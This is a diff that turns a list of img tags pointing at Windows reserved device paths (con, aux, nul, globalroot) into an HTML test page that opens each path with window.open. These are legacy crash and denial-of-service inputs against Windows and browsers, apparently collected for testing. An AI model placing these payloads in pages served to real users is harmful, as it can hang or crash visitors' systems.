@@ -1,5 +1,33 @@
-<img src="file:///\\\\.\\con">
-<img src="file:///\\\\.\\globalroot\\device\\null">
-<img src="file:///C:/con/con">
-<img src="file:///C:/aux/aux">
-<img src="file:///C:/nul/nul">
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Legacy Path Test</title>
+</head>
+<body>
+
+    <h2>Windows Reserved Device Test</h2>
+    <p>Note: Modern browsers (Chrome, Edge, Firefox) will block these actions for security.</p>
+
+    <button onclick="triggerRedirects()">Attempt Redirects</button>
+
+    <script>
+        function triggerRedirects() {
+            // These are the paths you provided
+            const paths = [
+                "file:///\\\\.\\con",
+                "file:///\\\\.\\globalroot\\device\\null",
+                "file:///C:/con/con",
+                "file:///C:/aux/aux",
+                "file:///C:/nul/nul"
+            ];
+
+            paths.forEach((path) => {
+                // This attempts to open each path in a new tab/window
+                console.log("Attempting to call: " + path);
+                window.open(path, '_blank');
+            });
+        }
+    </script>
+
+</body>
+</html>
